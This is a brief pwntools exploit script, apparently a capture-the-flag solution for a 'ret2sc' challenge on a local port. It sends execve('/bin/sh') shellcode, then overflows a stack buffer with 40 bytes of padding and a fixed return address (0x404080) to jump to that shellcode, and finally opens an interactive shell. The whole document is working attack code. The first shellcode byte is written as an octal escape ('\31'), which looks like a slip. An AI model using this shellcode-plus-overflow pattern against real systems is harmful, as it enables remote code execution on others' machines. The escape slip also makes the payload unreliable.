from pwn import *
context.arch = 'amd64'
#r = process('../ret2sc/share/ret2sc')
r = remote('127.0.0.1', 10003)
# shellcode = asm(shellcraft.sh())
shellcode = b'\31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendlineafter(b': ', shellcode)
payload = b'A' * (0x20 + 8) + p64(0x404080)
r.sendlineafter(b': ', payload)
r.recvuntil(b'!\n')
r.interactive()
